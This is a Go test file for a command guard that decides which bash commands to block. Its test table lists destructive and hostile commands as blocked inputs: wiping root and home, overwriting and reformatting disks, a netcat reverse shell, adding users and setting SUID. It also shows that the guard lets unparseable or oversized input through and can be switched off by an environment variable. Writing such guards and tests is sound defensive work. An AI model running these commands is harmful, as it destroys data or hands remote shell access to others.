//go:build !irify_exclude

package commandcheck

import (
	"context"
	"strings"
	"testing"

	"github.com/stretchr/testify/require"
)

func TestCheckBashCommand(t *testing.T) {
	tests := []struct {
		name       string
		command    string
		blocked    bool
		wantReason string
	}{
		{name: "safe-ls", command: "ls -la"},
		{name: "safe-rm-tmp", command: "rm -rf /tmp/build"},
		{name: "safe-nmap", command: "nmap -sT 10.0.0.1"},
		{name: "rm-root", command: "rm -rf /", blocked: true},
		{name: "rm-home", command: "rm -rf ~", blocked: true},
		{name: "dd-disk", command: "dd if=/dev/zero of=/dev/sda bs=1M count=1", blocked: true},
		{name: "mkfs", command: "mkfs.ext4 /dev/sda1", blocked: true},
		{name: "nc-reverse-shell", command: "nc -e /bin/sh 1.2.3.4 4444", blocked: true},
		{name: "useradd", command: "useradd someone", blocked: true},
		{name: "docker-privileged", command: "docker run --privileged alpine", blocked: true},
		{name: "chmod-suid", command: "chmod u+s /tmp/x", blocked: true},
		{
			name:       "parse-failure-is-allowed",
			command:    "if ( then",
			wantReason: "parse_failed",
		},
		{
			name:       "oversized-is-allowed",
			command:    strings.Repeat("# padding\n", 8*1024),
			wantReason: "too_large",
		},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			result := CheckCommand(context.Background(), test.command)
			require.True(t, result.Available, "guard should be available: %s", result.Reason)
			require.Equal(t, test.blocked, result.Blocked, "findings=%v reason=%s", result.Findings, result.Reason)
			if test.wantReason != "" {
				require.Contains(t, result.Reason, test.wantReason)
			}
			if test.blocked {
				require.NotEmpty(t, result.Findings)
				require.NotEmpty(t, result.Message())
				blockedResult := result.BlockedResult("bash")
				require.Equal(t, "blocked_by_bash_guard", blockedResult["termination_reason"])
				require.Equal(t, false, blockedResult["process_started"])
			}
		})
	}
}

func TestCheckBashCommandDisabled(t *testing.T) {
	t.Setenv(disableEnv, "1")
	result := CheckCommand(context.Background(), "rm -rf /")
	require.False(t, result.Blocked)
	require.Equal(t, "disabled", result.Reason)
}
